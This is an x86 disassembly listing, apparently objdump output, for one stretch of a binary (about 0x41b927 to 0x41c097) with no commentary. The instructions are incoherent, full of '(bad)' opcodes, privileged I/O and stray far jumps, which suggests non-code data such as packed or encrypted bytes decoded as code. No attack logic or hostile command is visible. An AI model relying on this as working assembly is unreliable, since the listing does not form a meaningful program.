  41b927:	shl    BYTE PTR [esi-0x698d56f5],cl
  41b92d:	data16 rcl BYTE PTR [ebp-0x5ef29a65],cl
  41b934:	mov    DWORD PTR [eax+ebx*4],ebp
  41b937:	data16 jne 0x41b990
  41b93a:	mov    ds:0x1a7d4d49,al
  41b93f:	js     0x41b9a8
  41b941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b942:	push   esi
  41b943:	dec    ebp
  41b944:	mov    di,0xd97f
  41b948:	nop
  41b949:	ret    
  41b94a:	mov    esp,0x87b1d1b8
  41b94f:	add    eax,DWORD PTR [ebx-0x6a09effd]
  41b955:	enter  0xdacd,0x2d
  41b959:	stos   DWORD PTR es:[edi],eax
  41b95a:	fidiv  DWORD PTR [ecx-0x5576fafb]
  41b960:	mov    esi,0x21b7665c
  41b965:	or     ah,dl
  41b967:	inc    ecx
  41b968:	or     DWORD PTR [eax+0x6e63e12],ebx
  41b96e:	pop    edx
  41b96f:	fs stos BYTE PTR es:[edi],al
  41b971:	push   eax
  41b972:	outs   dx,DWORD PTR ds:[esi]
  41b973:	or     ebx,DWORD PTR [esi+0x5786839e]
  41b979:	inc    ebp
  41b97a:	mov    ds:0xcd7d4bc6,al
  41b97f:	lock add eax,0x3d4aebad
  41b985:	iret   
  41b986:	or     al,0x5d
  41b988:	lock shr BYTE PTR [esi+0xfa3b08e],cl
  41b98f:	mov    bh,0x76
  41b991:	cmp    eax,0x83e33755
  41b996:	cmp    ecx,ebp
  41b998:	xor    al,0xd0
  41b99a:	mov    ebp,0x19409cdb
  41b99f:	cli    
  41b9a0:	and    eax,0x760d7113
  41b9a5:	into   
  41b9a6:	popf   
  41b9a7:	cdq    
  41b9a8:	push   0x34
  41b9aa:	jns    0x41b9f7
  41b9ac:	in     eax,0xf9
  41b9ae:	mov    ebp,0x77c7e842
  41b9b3:	pop    ecx
  41b9b4:	mov    ah,0x26
  41b9b6:	jmp    0x41b96f
  41b9b8:	mov    DWORD PTR [ebx+eiz*2-0x2c9a0e70],eax
  41b9bf:	jmp    0x99c0:0x31257ee2
  41b9c6:	nop
  41b9c7:	aam    0xcb
  41b9c9:	mov    al,0xe6
  41b9cb:	fwait
  41b9cc:	cmc    
  41b9cd:	jmp    0x41ba4d
  41b9cf:	fwait
  41b9d0:	enter  0x1863,0xb3
  41b9d4:	retf   
  41b9d5:	xor    eax,0x43efda13
  41b9da:	inc    ecx
  41b9db:	ins    BYTE PTR es:[edi],dx
  41b9dc:	outs   dx,DWORD PTR es:[esi]
  41b9de:	jl     0x41b9f2
  41b9e0:	in     eax,0x98
  41b9e2:	ficom  DWORD PTR [edx+0x17]
  41b9e5:	and    bh,BYTE PTR [edi-0x2a5a7768]
  41b9eb:	fwait
  41b9ec:	adc    al,0x4d
  41b9ee:	xchg   esp,eax
  41b9ef:	ret    0x209c
  41b9f2:	out    dx,eax
  41b9f3:	into   
  41b9f4:	imul   ecx,DWORD PTR [esi-0x2f],0x1586c941
  41b9fb:	out    dx,al
  41b9fc:	inc    eax
  41b9fd:	rol    dl,1
  41b9ff:	sbb    ecx,eax
  41ba01:	xchg   ecx,eax
  41ba02:	in     al,0xfb
  41ba04:	out    0xf3,al
  41ba06:	push   ebp
  41ba07:	mov    WORD PTR [esi],cs
  41ba09:	and    eax,0x90698fdc
  41ba0e:	pop    esi
  41ba0f:	sub    BYTE PTR [ebp-0x11],cl
  41ba12:	mov    al,0x3a
  41ba14:	cs iret 
  41ba16:	mov    al,ds:0xd335c87e
  41ba1b:	test   BYTE PTR [edi-0x301fd60],bl
  41ba21:	xor    edi,ecx
  41ba23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba24:	(bad)
  41ba27:	fwait
  41ba28:	ins    DWORD PTR es:[edi],dx
  41ba29:	add    eax,0xc63de8bc
  41ba2e:	ins    DWORD PTR es:[edi],dx
  41ba2f:	or     eax,0x6c112c23
  41ba34:	mov    ch,0x8c
  41ba36:	mov    eax,ds:0x122700f4
  41ba3b:	dec    eax
  41ba3c:	add    eax,0x8fa1deed
  41ba41:	adc    dl,BYTE PTR [edi+0x1c]
  41ba44:	mov    dh,0x75
  41ba46:	sub    al,0xe4
  41ba48:	or     ah,BYTE PTR [eax-0x3d]
  41ba4b:	dec    ebp
  41ba4c:	scas   al,BYTE PTR es:[edi]
  41ba4d:	or     al,0xca
  41ba4f:	fldcw  WORD PTR [ecx]
  41ba51:	xor    BYTE PTR [edi-0x4c],al
  41ba54:	jmp    ebx
  41ba56:	out    dx,eax
  41ba57:	jle    0x41bad1
  41ba59:	mov    BYTE PTR ds:0x3a15fc10,al
  41ba5f:	add    BYTE PTR [esi+0x21],ah
  41ba62:	dec    esp
  41ba63:	mov    ebx,0x97848982
  41ba68:	popa   
  41ba69:	iret   
  41ba6a:	out    0x66,eax
  41ba6c:	out    dx,al
  41ba6d:	ret    0x6ffe
  41ba70:	nop
  41ba71:	jns    0x41ba89
  41ba73:	push   ebx
  41ba74:	(bad)
  41ba77:	stos   BYTE PTR es:[edi],al
  41ba78:	fstp   TBYTE PTR [esi+0x1ddf98d5]
  41ba7e:	repz (bad) [eax+0x5d841711]
  41ba85:	pop    ebx
  41ba86:	fcmove st,st(7)
  41ba88:	ja     0x41baff
  41ba8a:	xor    eax,0x8deb4637
  41ba8f:	lods   al,BYTE PTR ds:[esi]
  41ba90:	or     DWORD PTR [ecx],ecx
  41ba92:	dec    edi
  41ba93:	and    al,0x71
  41ba95:	pop    edi
  41ba96:	dec    edx
  41ba97:	cwde   
  41ba98:	inc    esi
  41ba99:	arpl   WORD PTR [ecx],bp
  41ba9b:	pusha  
  41ba9c:	add    esi,edx
  41ba9e:	jbe    0x41bb1b
  41baa0:	jmp    0xb0ac899d
  41baa5:	stos   DWORD PTR es:[edi],eax
  41baa6:	call   0xf4d728c0
  41baab:	cmp    ebp,DWORD PTR [esi]
  41baad:	push   ds
  41baae:	dec    edi
  41baaf:	int    0xe2
  41bab1:	push   ss
  41bab2:	cli    
  41bab3:	push   cs
  41bab4:	gs cmp eax,0xfc133790
  41baba:	mov    cl,0xb1
  41babc:	sbb    DWORD PTR [ebp+0x4d1d4470],edx
  41bac2:	inc    esi
  41bac3:	int3   
  41bac4:	push   edi
  41bac5:	jne    0x41baf3
  41bac7:	shr    DWORD PTR [ebp-0x62ed8599],cl
  41bacd:	mov    ss,WORD PTR ds:0x4cf8f4c7
  41bad3:	repz add eax,0x1dd476f4
  41bad9:	or     DWORD PTR [ebx-0x2e],ebx
  41badc:	xlat   BYTE PTR ds:[ebx]
  41badd:	aaa    
  41bade:	shl    dh,0x44
  41bae1:	loop   0x41ba98
  41bae3:	jg     0x41ba94
  41bae5:	push   edx
  41bae6:	dec    edi
  41bae7:	std    
  41bae8:	mov    ds:0xce187d27,eax
  41baed:	inc    esp
  41baee:	(bad)  
  41baef:	sub    edi,DWORD PTR [edi+0x328bfa03]
  41baf5:	popa   
  41baf6:	stc    
  41baf7:	push   ebx
  41baf8:	xor    bh,BYTE PTR [esi-0x21]
  41bafb:	inc    eax
  41bafc:	idiv   BYTE PTR [esi]
  41bafe:	aaa    
  41baff:	in     eax,0xf1
  41bb01:	xchg   ebp,eax
  41bb02:	hlt    
  41bb03:	dec    ecx
  41bb04:	cmp    ebx,esp
  41bb06:	in     eax,0xde
  41bb08:	xchg   esi,eax
  41bb09:	retf   0xf9d1
  41bb0c:	stos   DWORD PTR es:[edi],eax
  41bb0d:	mov    edi,0x8e129579
  41bb12:	shr    esp,1
  41bb14:	and    edi,eax
  41bb16:	pop    eax
  41bb17:	rcr    DWORD PTR [edi+0x35e2e204],1
  41bb1d:	outs   dx,BYTE PTR ds:[esi]
  41bb1e:	imul   esi,DWORD PTR [edi-0x6d],0x2f
  41bb22:	fs pop ss
  41bb24:	fdivr  QWORD PTR [ecx-0x1ac04317]
  41bb2a:	lds    edx,FWORD PTR [ecx+eax*4+0x48]
  41bb2e:	fisubr WORD PTR [ecx+eiz*8]
  41bb31:	inc    BYTE PTR [edx-0x4016fa9f]
  41bb37:	mov    ebp,0xd4c198a3
  41bb3c:	call   0x41a260d2
  41bb41:	xchg   edx,eax
  41bb42:	push   0x89174abc
  41bb47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb49:	das    
  41bb4a:	lods   eax,DWORD PTR ds:[esi]
  41bb4b:	add    BYTE PTR ds:0x7cce32cb,0xc4
  41bb52:	out    0xe0,al
  41bb54:	not    dl
  41bb56:	jl     0x41bbc1
  41bb58:	imul   ebx,DWORD PTR [ebx+0x24],0xffffffe6
  41bb5c:	xchg   ecx,eax
  41bb5d:	cwde   
  41bb5e:	dec    edx
  41bb5f:	push   ebx
  41bb60:	inc    edi
  41bb61:	aam    0x55
  41bb63:	pop    ds
  41bb64:	sbb    eax,0x4619205a
  41bb69:	js     0x41bb54
  41bb6b:	icebp  
  41bb6c:	sbb    al,0x7c
  41bb6e:	mov    esi,0x20a3a10
  41bb73:	dec    edi
  41bb74:	xor    edx,0x355986d1
  41bb7a:	xor    eax,DWORD PTR [eax-0x3d]
  41bb7d:	cmp    BYTE PTR [esi-0xc],bl
  41bb80:	mov    bl,dl
  41bb82:	jnp    0x41bc01
  41bb84:	add    dh,BYTE PTR [edi+0x59f5f8e0]
  41bb8a:	jle    0x41bbb2
  41bb8c:	cdq    
  41bb8d:	add    ecx,DWORD PTR [edi+0x67362ec]
  41bb93:	int    0xf7
  41bb95:	aas    
  41bb96:	fidivr WORD PTR [ebx+0x17]
  41bb99:	enter  0xa414,0x24
  41bb9d:	lods   eax,DWORD PTR ds:[esi]
  41bb9e:	cmp    bl,bl
  41bba0:	add    DWORD PTR [ebx+0x5ec5e4b0],edx
  41bba6:	test   BYTE PTR [ebp-0x7d82716d],dl
  41bbac:	dec    ebp
  41bbad:	mov    ebx,0x9cc68086
  41bbb2:	(bad)  
  41bbb3:	lea    ecx,[edx]
  41bbb5:	ja     0x41bc01
  41bbb7:	xchg   esi,eax
  41bbb8:	sti    
  41bbb9:	ins    DWORD PTR es:[edi],dx
  41bbba:	dec    eax
  41bbbb:	push   es
  41bbbc:	jno    0x41bb97
  41bbbe:	xor    BYTE PTR [edx],ch
  41bbc0:	ja     0x41bc12
  41bbc2:	stos   DWORD PTR es:[edi],eax
  41bbc3:	dec    esi
  41bbc4:	cs mov cl,0xd8
  41bbc7:	call   0xda142a0c
  41bbcc:	push   0xb033ba5b
  41bbd1:	xchg   esp,eax
  41bbd2:	add    cl,bl
  41bbd4:	cld    
  41bbd5:	gs mov dl,0x0
  41bbd9:	nop
  41bbda:	repnz push esi
  41bbdc:	pop    es
  41bbdd:	js     0x41bc24
  41bbdf:	ins    DWORD PTR es:[edi],dx
  41bbe0:	ficom  WORD PTR ds:0x9969999b
  41bbe6:	push   ds
  41bbe7:	jae    0x41bc10
  41bbe9:	(bad)  
  41bbea:	fisttp QWORD PTR [ebp+0x2e]
  41bbee:	mov    ch,0xf1
  41bbf0:	pop    ebp
  41bbf1:	inc    esi
  41bbf2:	mov    al,0x4c
  41bbf4:	lahf   
  41bbf5:	xor    BYTE PTR [ecx+0x5d03b9e1],bl
  41bbfb:	ss dec ebp
  41bbfd:	xchg   DWORD PTR [ebp+esi*1+0x5bc1c318],edx
  41bc04:	mov    ebx,0x87e865
  41bc09:	pop    edi
  41bc0a:	xor    BYTE PTR [edx],bh
  41bc0c:	repz test BYTE PTR [ebx+0x28b124c1],cl
  41bc13:	xchg   esp,eax
  41bc14:	(bad)  
  41bc15:	xor    eax,0x19f300b7
  41bc1a:	jo     0x41bbbd
  41bc1c:	ins    BYTE PTR es:[edi],dx
  41bc1d:	arpl   sp,bp
  41bc1f:	xchg   edi,eax
  41bc20:	xchg   edi,eax
  41bc21:	ss inc ebx
  41bc23:	xchg   ebx,eax
  41bc24:	test   DWORD PTR [esi+0x6e1eec54],ebp
  41bc2a:	pop    esi
  41bc2b:	mov    bl,0xa2
  41bc2d:	lahf   
  41bc2e:	mov    eax,0xf416d33
  41bc33:	test   BYTE PTR [ebx+ebp*8-0x59],ch
  41bc37:	aas    
  41bc38:	div    BYTE PTR [esi]
  41bc3a:	out    0x15,al
  41bc3c:	xchg   edi,eax
  41bc3d:	push   esi
  41bc3e:	mov    ebp,0xb99eb6fa
  41bc43:	(bad)  [edi+0x32]
  41bc46:	loope  0x41bc10
  41bc48:	push   ebx
  41bc49:	cmc    
  41bc4a:	int3   
  41bc4b:	xchg   BYTE PTR [ecx-0x6ae36cf3],dl
  41bc51:	(bad)  
  41bc52:	and    edx,eax
  41bc54:	rol    BYTE PTR [eax],1
  41bc56:	enter  0xa01c,0xa7
  41bc5a:	jo     0x41bccb
  41bc5c:	and    BYTE PTR [edx+esi*4],dh
  41bc5f:	test   edi,eax
  41bc61:	pushf  
  41bc62:	push   0x5ef9d38
  41bc67:	pushf  
  41bc68:	add    BYTE PTR [ecx+0x4d4f3d18],0xfa
  41bc6f:	jecxz  0x41bc63
  41bc71:	std    
  41bc72:	jo     0x41bc79
  41bc74:	mov    bp,0x5732
  41bc78:	inc    ebp
  41bc7a:	arpl   ax,bx
  41bc7c:	test   BYTE PTR [edx],bl
  41bc7e:	and    cl,BYTE PTR [edx]
  41bc80:	dec    ebx
  41bc81:	pop    ds
  41bc82:	and    BYTE PTR [ecx-0xb64ff90],0x2c
  41bc89:	mov    ds:0xfbbadd85,eax
  41bc8e:	xor    ah,dh
  41bc90:	mov    bl,0x6c
  41bc92:	mov    esp,0x5caa4a96
  41bc97:	in     al,dx
  41bc98:	lea    ebp,[eax+0x2d]
  41bc9b:	iret   
  41bc9c:	jo     0x41bcb4
  41bc9e:	or     ebp,0x3c
  41bca1:	push   esp
  41bca2:	imul   ebp,DWORD PTR [edx-0xf],0xffffff9a
  41bca6:	iret   
  41bca7:	ret    
  41bca8:	lds    ecx,FWORD PTR ds:0x625ccbc8
  41bcae:	dec    ebx
  41bcaf:	push   cs
  41bcb0:	sbb    ebx,DWORD PTR [ebx+ebp*2+0x7b]
  41bcb4:	outs   dx,BYTE PTR ds:[esi]
  41bcb5:	std    
  41bcb6:	push   edx
  41bcb7:	pushf  
  41bcb8:	lea    ecx,[edx+0x41fb2e8e]
  41bcbe:	sub    ebp,DWORD PTR [eax]
  41bcc0:	cmc    
  41bcc1:	or     DWORD PTR [edi-0x25],ecx
  41bcc4:	dec    eax
  41bcc5:	lods   eax,DWORD PTR ds:[esi]
  41bcc6:	ss std 
  41bcc8:	adc    BYTE PTR [ebx-0x16],0x8a
  41bccc:	adc    dh,BYTE PTR [ecx-0x1801ed0f]
  41bcd2:	inc    ebx
  41bcd3:	cld    
  41bcd4:	push   ecx
  41bcd5:	add    al,0xc7
  41bcd7:	addr16 (bad) 
  41bcd9:	mov    ebp,0xf74382cf
  41bcde:	nop
  41bcdf:	xchg   edi,eax
  41bce0:	push   0x4f
  41bce2:	jno    0x41bce5
  41bce4:	cli    
  41bce5:	ins    BYTE PTR es:[edi],dx
  41bce6:	pop    esp
  41bce7:	call   0x8e59f802
  41bcec:	mov    ds:0xefe50574,al
  41bcf1:	dec    ebp
  41bcf2:	jne    0x41bcbf
  41bcf4:	sub    esp,DWORD PTR [ecx*8-0x29335b03]
  41bcfb:	push   ebp
  41bcfd:	ins    DWORD PTR es:[edi],dx
  41bcfe:	adc    DWORD PTR [ecx],0x3aeda57b
  41bd04:	bound  eax,QWORD PTR [ecx]
  41bd06:	cs std 
  41bd08:	fs jl  0x41bcb8
  41bd0b:	mov    dl,0xd6
  41bd0d:	enter  0x6889,0x2b
  41bd11:	xchg   ebp,eax
  41bd12:	repz jmp 0x41bd3f
  41bd15:	sub    al,0x31
  41bd17:	fs in  eax,0x2c
  41bd1a:	lods   eax,DWORD PTR fs:[esi]
  41bd1c:	mov    ecx,0xa2cc55b5
  41bd21:	adc    al,cl
  41bd23:	popf   
  41bd24:	hlt    
  41bd25:	sbb    bl,ah
  41bd27:	jp     0x41bd4e
  41bd29:	call   0xd662b9f7
  41bd2e:	jle    0x41bd76
  41bd30:	cmp    al,0xb8
  41bd32:	lods   al,BYTE PTR ds:[esi]
  41bd33:	xor    DWORD PTR ds:0x9d6f825b,ebp
  41bd39:	popf   
  41bd3a:	sbb    eax,0xa8fecd4d
  41bd3f:	sbb    BYTE PTR [ebp+0x72],bh
  41bd42:	lods   eax,DWORD PTR ds:[esi]
  41bd43:	push   esp
  41bd44:	call   0xe0c0:0xd7a97bf0
  41bd4b:	mov    dh,0x3b
  41bd4d:	mov    esp,0xc96b106a
  41bd52:	test   al,0xf6
  41bd54:	mov    eax,0x2708411e
  41bd59:	pop    esi
  41bd5a:	lahf   
  41bd5b:	hlt    
  41bd5c:	(bad)  
  41bd5d:	ins    BYTE PTR es:[edi],dx
  41bd5e:	cmc    
  41bd5f:	mov    edx,0x5038c0cb
  41bd64:	pop    esp
  41bd65:	mov    edi,DWORD PTR [ebx]
  41bd67:	mov    ebx,0xd5af1726
  41bd6c:	dec    edi
  41bd6d:	(bad)  
  41bd6e:	sub    eax,0x685c0e0c
  41bd73:	iret   
  41bd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd75:	cli    
  41bd76:	xor    esp,DWORD PTR [eax+0x56]
  41bd79:	jne    0x41bdaa
  41bd7b:	mov    esi,0x364d569b
  41bd80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd81:	ins    DWORD PTR es:[edi],dx
  41bd82:	mov    ah,0xe9
  41bd84:	std    
  41bd85:	pop    es
  41bd86:	xor    BYTE PTR [edi+esi*2+0x66],cl
  41bd8a:	lds    ebp,FWORD PTR [esi+0x77]
  41bd8d:	gs pop ebp
  41bd8f:	sbb    ebx,ebx
  41bd91:	jp     0x41bdcd
  41bd93:	iret   
  41bd94:	ja     0x41bd24
  41bd96:	mov    ebx,DWORD PTR [edi]
  41bd98:	aas    
  41bd99:	sbb    DWORD PTR [ebx+0x19],esi
  41bd9c:	(bad)  
  41bd9e:	inc    esi
  41bd9f:	fnstcw WORD PTR [ebx]
  41bda1:	cmp    edi,DWORD PTR [eax+0x776455c1]
  41bda7:	dec    edi
  41bda8:	mov    DWORD PTR ds:0xf97e4050,ebx
  41bdae:	jbe    0x41bde7
  41bdb0:	test   dl,al
  41bdb2:	or     DWORD PTR [edx-0x11a4c501],ecx
  41bdb8:	int    0x98
  41bdba:	imul   eax,eax,0xfffffffd
  41bdbd:	cmp    ebx,DWORD PTR [esi+0x29d4577a]
  41bdc3:	or     dl,BYTE PTR [esi]
  41bdc5:	mov    ah,0x3f
  41bdc7:	fistp  WORD PTR [ecx]
  41bdc9:	mov    bl,0x3b
  41bdcb:	xchg   edx,eax
  41bdcc:	sti    
  41bdcd:	(bad)  
  41bdce:	(bad)  
  41bdcf:	call   0x4210:0x74540309
  41bdd6:	mov    cl,0xda
  41bdd8:	in     eax,dx
  41bdd9:	into   
  41bdda:	mov    bl,0x66
  41bddc:	lahf   
  41bddd:	mov    gs,WORD PTR [edx]
  41bddf:	jecxz  0x41be4d
  41bde1:	ins    BYTE PTR es:[edi],dx
  41bde2:	push   0x50e8a06d
  41bde7:	mov    DWORD PTR ss:[edi+0x3afb3d08],edx
  41bdee:	jge    0x41bdad
  41bdf0:	shl    DWORD PTR [edx],0xa3
  41bdf3:	xchg   esp,eax
  41bdf4:	mov    ecx,0x4a23fb3
  41bdf9:	inc    esp
  41bdfa:	aaa    
  41bdfb:	mov    edx,0xcb38ee62
  41be00:	ror    BYTE PTR [eax-0x7a],1
  41be03:	mov    BYTE PTR [edx+0x552533a],dl
  41be09:	or     BYTE PTR [ecx-0x69],ah
  41be0c:	jmp    0x9000a780
  41be11:	std    
  41be12:	nop
  41be13:	pop    ss
  41be14:	inc    ecx
  41be15:	xor    esi,DWORD PTR [esp+eiz*2]
  41be18:	jmp    0x41be8d
  41be1a:	xchg   esp,eax
  41be1b:	mov    WORD PTR [esp+ebx*1+0x20e3f3d4],cs
  41be22:	mov    BYTE PTR [esi],dh
  41be24:	sbb    eax,0x3c9bca18
  41be29:	clc    
  41be2a:	imul   ebx,DWORD PTR [ebx+0x46],0x6d664242
  41be31:	sbb    DWORD PTR [ebx-0xbb55918],0xfffffff3
  41be38:	sbb    BYTE PTR [edx],dl
  41be3a:	inc    ebx
  41be3b:	xchg   ebx,eax
  41be3c:	inc    esp
  41be3d:	test   DWORD PTR [edi+0x41],esp
  41be40:	data16 loop 0x41be85
  41be43:	stos   BYTE PTR es:[edi],al
  41be44:	mov    al,0xea
  41be46:	icebp  
  41be47:	je     0x41be47
  41be49:	mov    ebx,0xfa2bb5bc
  41be4e:	pusha  
  41be4f:	and    BYTE PTR [edx],dh
  41be51:	call   0xb205:0x847b91ef
  41be58:	(bad)  
  41be5a:	(bad)  
  41be5c:	mov    edi,0x8e253f81
  41be61:	jbe    0x41bed7
  41be63:	sbb    BYTE PTR [ebp+0x507a76e1],ch
  41be69:	add    BYTE PTR [ebp+edi*8+0xa],cl
  41be6d:	xor    BYTE PTR [edi-0x5e9cd8f1],ch
  41be73:	(bad)  
  41be74:	shl    BYTE PTR [edx+0x78],cl
  41be77:	cmp    eax,0x64f270ca
  41be7c:	sub    DWORD PTR [esi-0x46ec479b],eax
  41be82:	shr    al,cl
  41be84:	sahf   
  41be85:	jg     0x41be52
  41be87:	push   ebp
  41be88:	imul   esp,DWORD PTR [edx-0x8bc742c],0xfffffff0
  41be8f:	inc    edx
  41be90:	inc    edi
  41be91:	dec    edi
  41be92:	js     0x41beae
  41be94:	fild   WORD PTR [ecx-0x68e52a37]
  41be9a:	imul   eax,DWORD PTR [esi],0x1d4c441d
  41bea0:	sbb    dh,BYTE PTR [ecx+eax*4-0x18]
  41bea4:	js     0x41bef5
  41bea6:	push   0xffffffff
  41bea8:	and    eax,0x8f1e8d9c
  41bead:	ret    0xbdcb
  41beb0:	mov    ds:0x1c3ebbda,al
  41beb5:	in     al,0xa5
  41beb7:	jp     0x41bf1e
  41beb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beba:	cmp    bh,bh
  41bebc:	pop    esi
  41bebd:	js     0x41beab
  41bebf:	dec    ebp
  41bec0:	popf   
  41bec1:	sbb    eax,0x5b5fe69d
  41bec6:	fwait
  41bec7:	jge    0x41be75
  41bec9:	xlat   BYTE PTR ds:[ebx]
  41beca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41becb:	enter  0xac2d,0x66
  41becf:	push   eax
  41bed0:	pop    edx
  41bed1:	jmp    0x570c5672
  41bed6:	push   esi
  41bed7:	cmp    dl,0xac
  41beda:	test   BYTE PTR [eax+0x23483ff4],dh
  41bee0:	leave  
  41bee1:	mov    ch,0x6f
  41bee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bee4:	xchg   ebp,eax
  41bee5:	iret   
  41bee6:	test   eax,0xf25eecf4
  41beeb:	dec    ebp
  41beec:	stos   BYTE PTR es:[edi],al
  41beed:	inc    ebp
  41beee:	sbb    ebx,DWORD PTR [esi]
  41bef0:	sahf   
  41bef1:	xchg   ebp,eax
  41bef2:	mov    esp,fs
  41bef4:	mov    eax,0xce1cfd5f
  41bef9:	loope  0x41be97
  41befb:	in     al,dx
  41befc:	inc    esi
  41befd:	cmp    esp,esi
  41beff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf00:	aaa    
  41bf01:	jo     0x41bf63
  41bf03:	out    dx,eax
  41bf04:	nop
  41bf05:	aam    0xbd
  41bf07:	pop    esp
  41bf08:	retf   0x9745
  41bf0b:	or     DWORD PTR fs:[ecx],0x12
  41bf0f:	test   BYTE PTR [eax-0x6],ch
  41bf12:	scas   eax,DWORD PTR es:[edi]
  41bf13:	sub    BYTE PTR [ecx+ebp*8-0x69],ah
  41bf17:	das    
  41bf18:	inc    edi
  41bf19:	in     eax,0x3e
  41bf1b:	or     edx,ebp
  41bf1d:	mov    edi,0xf374a329
  41bf22:	out    0xe8,al
  41bf24:	jbe    0x41bfa2
  41bf26:	dec    esi
  41bf27:	out    0xb2,eax
  41bf29:	cmc    
  41bf2a:	xchg   ebp,eax
  41bf2b:	inc    ebp
  41bf2c:	jg     0x41bf27
  41bf2e:	add    DWORD PTR [edx+ecx*8+0x14],edi
  41bf32:	stos   BYTE PTR es:[edi],al
  41bf33:	adc    al,0x6f
  41bf35:	cld    
  41bf36:	scas   eax,DWORD PTR es:[edi]
  41bf37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf38:	popf   
  41bf39:	(bad)  
  41bf3a:	cmp    eax,0x1fbb6ff0
  41bf3f:	test   eax,0x62211c77
  41bf44:	and    ah,BYTE PTR [esi]
  41bf46:	setns  BYTE PTR [edx]
  41bf49:	sbb    bh,BYTE PTR [ebx-0x60]
  41bf4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf4d:	inc    ebx
  41bf4e:	ftst   
  41bf50:	jae    0x41bfcc
  41bf52:	pop    ebp
  41bf53:	xchg   edx,eax
  41bf54:	outs   dx,BYTE PTR ds:[esi]
  41bf55:	and    cl,BYTE PTR [ebp-0x3f]
  41bf58:	(bad)  
  41bf59:	mov    al,ds:0xda2311c5
  41bf5e:	aaa    
  41bf5f:	aad    0x68
  41bf61:	adc    eax,0x402ab976
  41bf66:	das    
  41bf67:	fs loop 0x41bfe2
  41bf6a:	lahf   
  41bf6b:	scas   al,BYTE PTR es:[edi]
  41bf6c:	or     al,dl
  41bf6e:	xchg   ebp,eax
  41bf6f:	mov    esi,0x4d2cd8b3
  41bf74:	dec    esi
  41bf75:	imul   eax,DWORD PTR [esi-0x2c45eacf],0x4086cd03
  41bf7f:	mov    ds:0x1f495bab,al
  41bf84:	cmp    ebx,ebp
  41bf86:	popa   
  41bf87:	jae    0x41bf16
  41bf89:	retf   
  41bf8a:	scas   eax,DWORD PTR es:[edi]
  41bf8b:	(bad)  
  41bf8c:	adc    eax,0x68bd2026
  41bf91:	mov    al,cl
  41bf93:	clc    
  41bf94:	jecxz  0x41bfcf
  41bf96:	or     edi,DWORD PTR [edi-0x55]
  41bf99:	inc    ebx
  41bf9a:	pushf  
  41bf9b:	call   0xf33f6b3b
  41bfa0:	iret   
  41bfa1:	inc    ebx
  41bfa2:	neg    esi
  41bfa4:	cmp    esi,DWORD PTR [eax]
  41bfa6:	call   0xab3e:0xf112277a
  41bfad:	(bad)  
  41bfae:	pop    edi
  41bfaf:	mov    ss,WORD PTR [edx-0x47]
  41bfb2:	or     dh,BYTE PTR [ebp+0x9fc7a81]
  41bfb8:	cs aas 
  41bfba:	call   0x19a4dee8
  41bfbf:	(bad)  
  41bfc0:	in     eax,0x96
  41bfc2:	dec    eax
  41bfc3:	adc    DWORD PTR [edi+0x2716439e],esp
  41bfc9:	(bad)  
  41bfca:	mov    BYTE PTR cs:[eax+0x13853d0f],0x3b
  41bfd2:	das    
  41bfd3:	sub    ebx,DWORD PTR [edx-0x2a1df7f7]
  41bfd9:	dec    edi
  41bfda:	pushf  
  41bfdb:	adc    al,0x10
  41bfdd:	mov    eax,0xd0724532
  41bfe2:	dec    ebp
  41bfe3:	fucomi st,st(7)
  41bfe5:	push   edx
  41bfe6:	(bad)  
  41bfe7:	and    esp,DWORD PTR ds:0x7512a590
  41bfed:	xchg   ebp,eax
  41bfee:	dec    edi
  41bfef:	loope  0x41c02c
  41bff1:	addr16 repnz shr dl,cl
  41bff5:	ror    BYTE PTR [ebx-0x3f241e41],0x76
  41bffc:	aam    0x54
  41bffe:	fdiv   st(0),st
  41c000:	ja     0x41c07f
  41c002:	loop   0x41bf9a
  41c004:	mov    ds:0xe5e1eebc,al
  41c009:	in     eax,dx
  41c00a:	push   ds
  41c00b:	push   esi
  41c00c:	pusha  
  41c00d:	adc    BYTE PTR [edi-0x4c],ch
  41c010:	pop    ebp
  41c011:	jge    0x41c007
  41c013:	out    0x89,al
  41c015:	inc    esp
  41c016:	cmp    DWORD PTR [eax+0x3f],eax
  41c019:	add    DWORD PTR [ebp+ebx*4+0xea76e9a],edi
  41c020:	ins    BYTE PTR es:[edi],dx
  41c021:	fbld   TBYTE PTR [edx+0x48e98d8a]
  41c027:	fsubrp st(7),st
  41c029:	jecxz  0x41c00c
  41c02b:	fnstsw WORD PTR [ebp-0x668e9ad3]
  41c031:	aad    0xcb
  41c033:	cmp    eax,DWORD PTR [edx+0x4]
  41c036:	mov    ecx,0xed97bdd0
  41c03b:	cmp    BYTE PTR [eax+eax*1],dl
  41c03e:	push   esi
  41c03f:	sub    eax,0xa66c3907
  41c044:	sar    DWORD PTR [edi-0x4e],0x35
  41c048:	inc    ebx
  41c049:	xchg   ebp,eax
  41c04a:	adc    esp,DWORD PTR ds:0x4cbf8892
  41c050:	jo     0x41bfdd
  41c052:	mov    esi,0x4d53308
  41c057:	mov    ch,0x9f
  41c059:	pop    ebx
  41c05a:	jmp    0x1cd48b66
  41c05f:	mov    DWORD PTR [ebx-0x55d96b6e],ebp
  41c065:	stc    
  41c066:	int    0x28
  41c068:	in     eax,0x80
  41c06a:	push   edi
  41c06b:	mov    es,WORD PTR [ebx+0x41]
  41c06e:	inc    edi
  41c06f:	mov    ah,BYTE PTR [esi]
  41c071:	jbe    0x41c072
  41c073:	pop    ebx
  41c074:	xchg   edi,eax
  41c075:	bound  ebp,QWORD PTR ds:0xebb819c4
  41c07b:	or     BYTE PTR [edx],ch
  41c07d:	ret    0x928a
  41c080:	call   0x96b9:0xb45ff45c
  41c087:	mov    al,0x16
  41c089:	adc    eax,0xd1354607
  41c08e:	outs   dx,DWORD PTR ds:[esi]
  41c08f:	dec    eax
  41c090:	dec    ecx
  41c091:	cmp    DWORD PTR [ebp+0x18bcff15],esi
  41c097:	xlat   BYTE PTR ds:[ebx]
